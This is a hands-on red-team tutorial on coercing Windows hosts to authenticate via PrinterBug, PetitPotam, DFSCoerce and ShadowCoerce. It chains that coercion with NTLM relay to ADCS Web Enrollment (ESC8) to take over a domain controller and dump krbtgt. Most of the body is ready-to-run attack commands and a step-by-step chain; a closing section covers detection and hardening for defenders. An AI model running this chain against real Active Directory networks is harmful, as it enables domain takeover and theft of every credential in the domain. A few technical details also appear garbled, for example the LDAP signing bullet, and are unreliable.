---
title: "Coerced Authentication Attacks: PetitPotam, PrinterBug, DFSCoerce, and the ADCS ESC8 Chain"
description: "A practical guide to authentication coercion in Active Directory - the four RPC primitives that force a remote host to authenticate to you, how to chain them with NTLM relay to ADCS, and why patched doesn't always mean fixed."
date: 2026-04-07
difficulty: Hard
tags: [active-directory, ntlm, adcs, petitpotam, printerbug, relay]
---

## The Primitive

Authentication coercion is straightforward in concept: you call an RPC method on a remote Windows host that makes *it* authenticate back to a location you control. No user interaction required. The target host does the outbound auth automatically using its machine account.

Why does this matter? Because NTLM relay needs *someone* to authenticate in your direction. In a flat network with Responder running, you wait for a user to trip over a broken share or mistype a hostname. Coercion skips the waiting - you pick a target, trigger it, and the auth comes to you on demand.

## The Four Primitives

Every coercion technique exploits a different RPC interface, but they all do the same thing: accept a UNC path, attempt to read from it, and authenticate in the process.

| Technique | Protocol / Interface | Method | Requires |
|---|---|---|---|
| **PrinterBug** | MS-RPRN (Print Spooler) | `RpcRemoteFindFirstPrinterChangeNotification` | Print Spooler running; any AD user |
| **PetitPotam** | MS-EFSRPC (EFS RPC) | `EfsRpcOpenFileRaw`, `EfsRpcEncryptFileSrv` | Any AD user (pre-patch); unauthenticated (earliest PoC) |
| **DFSCoerce** | MS-DFSNM (DFS Namespace) | `NetrDfsRemoveStdRoot` | Any AD user; DFS service available (usually DCs) |
| **ShadowCoerce** | MS-FSRVP (File Server VSS) | `IsPathSupported` | File Server VSS Agent enabled |

And several more that keep being discovered - `PrivExchange`, `HiveNightmare`/`SeriousSAM` adjacent, `CheeseOunce`. Microsoft plays whack-a-mole; the technique class won't go away because it's architectural.

## Hands-On: Triggering Each

### PrinterBug

```bash
# python - using Impacket's printerbug.py
python3 printerbug.py corp.local/jsmith:'Pa55w0rd!'@dc01.corp.local attacker-ip
```

Works against **any host with the Print Spooler service running**. Historically every DC had it on by default. Microsoft's patches disable it on DCs in newer builds, but you still find it on 2016/2019.

### PetitPotam

```bash
# Authenticated trigger (works post-patch on most unhardened servers)
python3 PetitPotam.py -u jsmith -p 'Pa55w0rd!' -d corp.local attacker-ip target-ip

# The classic unauthenticated trigger (patched in 2021 but still works on ancient builds):
python3 PetitPotam.py attacker-ip target-ip
```

Also integrated into Coercer:

```bash
coercer coerce -u jsmith -p 'Pa55w0rd!' -d corp.local -t target-ip -l attacker-ip \
  --filter-method-name EfsRpcOpenFileRaw
```

### DFSCoerce

```bash
python3 dfscoerce.py -u jsmith -p 'Pa55w0rd!' -d corp.local attacker-ip dc01.corp.local
```

DFSCoerce is special - it targets the DFS service which almost always runs on DCs. When PrinterBug and PetitPotam are patched, DFSCoerce often still works.

### The Unified Tool: Coercer

Instead of remembering which script does which, **Coercer** enumerates all known primitives against a target and fires the ones that respond:

```bash
coercer scan -u jsmith -p 'Pa55w0rd!' -d corp.local -t dc01.corp.local
# Output: lists every coercion method the host supports

coercer coerce -u jsmith -p 'Pa55w0rd!' -d corp.local -t dc01.corp.local -l attacker-ip
# Fires every method until one succeeds
```

## The Killer Chain: Coerce → Relay → ADCS ESC8

Coercion on its own gets you a **machine-account NetNTLMv2 hash** - not immediately useful. Machine passwords are 120+ bytes of random, you're not cracking them offline.

The magic is chaining: **relay** that authentication to a service that accepts NTLM, use the DC's machine account to request a **certificate** from ADCS, then use that certificate to authenticate as the DC. From there: DCSync.

### The ADCS Web Enrollment Vulnerability (ESC8)

ADCS's Web Enrollment endpoint (`http://cert-server/certsrv/`) accepts NTLM without Channel Binding or Extended Protection by default. Relay target: `http://cert-server/certsrv/certfnsh.asp`. Submit a CSR claiming to be `DC01$`, receive a signed certificate valid for client auth.

### Full Chain Walkthrough

**Step 1**: Identify an ADCS server with Web Enrollment enabled.

```bash
certipy-ad find -u jsmith@corp.local -p 'Pa55w0rd!' -dc-ip 10.0.0.1 -stdout -vulnerable
```

Look for "ESC8" in the output. If present, proceed.

**Step 2**: Start ntlmrelayx targeting the CA.

```bash
impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp \
                    -smb2support --adcs --template DomainController
```

The `DomainController` template is the one that issues certs valid for DCs. Some environments lock it down to the `Domain Controllers` group only - a DC's machine account still qualifies.

**Step 3**: Coerce the DC.

```bash
python3 PetitPotam.py -u jsmith -p 'Pa55w0rd!' -d corp.local attacker-ip dc01.corp.local
```

Target: `dc01.corp.local`. Listener: your machine running ntlmrelayx.

**Step 4**: ntlmrelayx relays the DC's auth to the ADCS Web Enrollment endpoint, submits a CSR, and receives a certificate. Output:

```
[*] Base64 certificate of user DC01$:
MIIRZwIBAzCCESMGCSqGSIb3DQE...
```

**Step 5**: Use the certificate to request a TGT for the DC's machine account via PKINIT.

```bash
certipy-ad auth -pfx dc01.pfx -dc-ip 10.0.0.1
```

Output: NT hash of the DC's machine account **and** a TGT.

**Step 6**: DCSync with the DC's hash.

```bash
impacket-secretsdump -hashes :<dc-machine-nt-hash> corp.local/DC01\$@dc01.corp.local
```

You now have `krbtgt`. Game over.

**Total time**: about 90 seconds once the pieces are laid out.

## Alternative Relay Targets

ADCS isn't the only thing worth relaying to. Depending on what's misconfigured, any of these work:

| Target | Result |
|---|---|
| **LDAP (without signing)** | Add a shadow-credentials key to the target, or modify `msDS-AllowedToActOnBehalfOfOtherIdentity` for RBCD |
| **LDAPS** | Same as LDAP, but signing doesn't matter on LDAPS |
| **HTTP/WebDAV** | Trigger over WebDAV to force NTLM; relay for ADCS or EWS |
| **SMB (without signing)** | Execute commands via `DCOM`, `PSExec`-style lateral movement |
| **IMAP/POP3/SMTP (Exchange)** | Read mail, pivot into Exchange |

`impacket-ntlmrelayx -tf targets.txt` with mixed targets lets one coercion fire at many relay chains.

## Detection and Defense

The reason coerced auth attacks keep working is that Microsoft can't turn off RPC. They can only harden individual endpoints, one at a time. Defense has three pillars:

### 1. Kill NTLM Where Possible

- **LDAP signing enforced** → `msDS-SupportedEncryptionTypes` and domain-level signing required
- **SMB signing required** on all servers (not just DCs)
- **EPA (Extended Protection for Authentication)** on HTTP services - breaks most HTTP relay
- **Channel Binding** on LDAPS

### 2. Deny the Chain, Not the Primitive

Don't try to patch every coercion method - focus on ADCS:

- Disable Web Enrollment on CAs. It's been deprecated and rarely used in modern deployments.
- Enforce **EPA + HTTPS-only** on any Web Enrollment that must stay.
- Remove the `NTAuth` flag from CAs that don't need to issue logon certs.
- Lock certificate templates to explicit groups. `Domain Controllers`, not `Domain Computers`.

### 3. Monitor

- **Event 4624 logon type 3** from `HOST$` accounts where the workstation name is unexpected - a relayed auth looks like the machine logging in from somewhere new.
- **ADCS logs**: certificate issuance events (`4886`, `4887`, `4888`) - any cert issued to a machine account should be investigated.
- **Network**: SMB or LDAP connections from a DC to an unexpected host.

Elastic's rule `Potential Credential Access via Windows Utilities` + Sigma's ADCS detection pack are good starting points.

## Unauthenticated Coercion: Still Possible?

PetitPotam's original PoC was fully unauthenticated. Microsoft patched `EfsRpcOpenFileRaw`, but researchers keep finding unauth variants:

- `EfsRpcEncryptFileSrv` (MS21-036 aftermath)
- `EfsRpcQueryUsersOnFile`
- `EfsRpcQueryRecoveryAgents`

The patch landscape is messy. Against an unhardened domain with older DCs, **unauthenticated coercion** can happen - initial access without even a low-priv user.

```bash
# Coercer will try unauthenticated variants if you omit credentials
coercer coerce -t dc01.corp.local -l attacker-ip
```

## Summary

Coerced authentication is an infrastructure-level primitive. You can't remove it with a patch - only by removing NTLM. Until then, the **coerce → relay → ADCS** chain is the single most reliable internal-network privilege escalation path in modern Active Directory environments.

> If your threat model is "an attacker gets domain user credentials," and your ADCS has Web Enrollment enabled, your threat model is actually "an attacker gets Domain Admin."
